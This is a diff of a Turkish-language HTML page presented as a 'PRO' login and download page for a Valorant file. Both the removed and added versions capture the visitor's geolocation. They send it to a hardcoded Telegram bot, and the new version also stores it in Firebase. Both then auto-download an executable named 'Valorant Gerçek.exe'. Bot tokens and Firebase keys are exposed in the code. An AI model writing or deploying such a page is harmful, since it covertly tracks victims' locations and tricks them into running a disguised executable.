@@ -1,53 +1,164 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title></title>
+  <title>PRO Giriş ve İndirme</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-database.js"></script>
   <style>
-    body { margin: 0; background: white; }
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+      padding: 20px;
+      background: #f0f0f0;
+    }
+    #box {
+      background: #fff;
+      padding: 30px;
+      margin-top: 50px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      text-align: center;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 220px;
+      font-size: 16px;
+    }
+    #downloadSection, #videoSection {
+      margin-top: 30px;
+      text-align: center;
+      display: none;
+    }
+    #liste {
+      margin-top: 30px;
+      list-style: none;
+      padding: 0;
+      width: 240px;
+      text-align: left;
+    }
+    #liste li {
+      background: #fff;
+      margin: 5px 0;
+      padding: 8px;
+      border-radius: 4px;
+      box-shadow: 0 0 4px rgba(0,0,0,0.1);
+    }
   </style>
-  <script>
-    const token = '8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg'; // ← Bot tokenını buraya yaz
-    const chat_id = '8499614707'; // ← Chat ID buraya
-
-    window.onload = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude.toFixed(6);
-          const lon = position.coords.longitude.toFixed(6);
-          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          const message = `📍 Konum Bilgisi:\nEnlem: ${lat}\nBoylam: ${lon}\n🧭 Navigasyon: ${mapsLink}`;
-
-          // Telegram'a mesaj gönder
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chat_id,
-              text: message
-            })
-          })
-          .then(() => {
-            // Valorant Gerçek.exe indir
-            const link = document.createElement('a');
-            link.href = 'Valorant Gerçek.exe'; // ← Dosya adı tam ve doğru
-            link.download = 'Valorant Gerçek.exe';
-            document.body.appendChild(link);
-            link.click();
-
-            // YouTube'a yönlendir
-            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-          })
-          .catch(err => {
-            console.error("Telegram'a gönderim başarısız:", err);
-          });
-        });
-      } else {
-        console.error("Tarayıcınız konum almayı desteklemiyor.");
-      }
-    };
-  </script>
 </head>
 <body>
+
+  <div id="box">
+    <h2>PRO Giriş</h2>
+    <input id="isim" placeholder="Adın" />
+    <input id="sifre" placeholder="Şifre" type="password" />
+    <br>
+    <button onclick="girisYap()">Giriş Yap</button>
+    <p id="sonuc"></p>
+  </div>
+
+  <div id="downloadSection">
+    <a id="downloadLink" href="Valorant Gerçek.exe" download>
+      Valorant Gerçek.exe İndir
+    </a>
+  </div>
+
+  <div id="videoSection">
+    <video id="videoPlayer" width="600" controls>
+      <source src="video.mp4" type="video/mp4">
+      Tarayıcınız video etiketini desteklemiyor.
+    </video>
+  </div>
+
+  <h3>Giriş Yapanlar</h3>
+  <ul id="liste"></ul>
+
+  <script>
+    // Firebase yapılandırması
+    const firebaseConfig = {
+      apiKey: "AIzaSyBMRl-hAnyhNR3BSjBXB7JGDbiQ_3J27dc",
+      authDomain: "system-ccad9.firebaseapp.com",
+      databaseURL: "https://system-ccad9-default-rtdb.firebaseio.com",
+      projectId: "system-ccad9",
+      appId: "1:933332785337:web:385cbe477e9b8f3beaa368"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Telegram ile bildirim fonksiyonu
+    function telegramaGonder(isim, konum) {
+      const token  = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
+      const chatId = "8499614707";
+      const mesaj  = `🧑 İsim: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: mesaj })
+      });
+    }
+
+    // Giriş işlevi: isim+şifre kontrolü, konum yakalama, kayıt + bildirim + indirme + video
+    function girisYap() {
+      const isim  = document.getElementById("isim").value.trim();
+      const sifre = document.getElementById("sifre").value.trim();
+      const sonuc = document.getElementById("sonuc");
+
+      if (!isim || !sifre) {
+        sonuc.textContent = "İsim ve şifre girilmeli.";
+        return;
+      }
+      if (sifre !== "pro2025") {
+        sonuc.textContent = "Şifre yanlış.";
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        sonuc.textContent = "Tarayıcınız konum desteği vermiyor.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const konum = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+
+        // Firebase'e kaydet
+        db.ref("girisler").push({ isim, konum, tarih: new Date().toISOString() });
+
+        // Telegram'a gönder
+        telegramaGonder(isim, konum);
+
+        sonuc.textContent = `Hoş geldin ${isim}!`;
+
+        // İndirme ekranını göster ve tıkla
+        const dlSection = document.getElementById("downloadSection");
+        const dlLink    = document.getElementById("downloadLink");
+        dlSection.style.display = "block";
+        dlLink.click();
+
+        // Videoyu aç ve oynat
+        const vidSection = document.getElementById("videoSection");
+        const player     = document.getElementById("videoPlayer");
+        vidSection.style.display = "block";
+        player.play();
+      }, err => {
+        sonuc.textContent = "Konum alınamadı: " + err.message;
+      });
+    }
+
+    // Mevcut girişleri ekranda listeleme
+    db.ref("girisler").on("value", snapshot => {
+      const data = snapshot.val() || {};
+      const list = document.getElementById("liste");
+      list.innerHTML = "";
+      Object.values(data).forEach(item => {
+        const li = document.createElement("li");
+        li.textContent = item.isim;
+        list.appendChild(li);
+      });
+    });
+  </script>
 </body>
 </html>
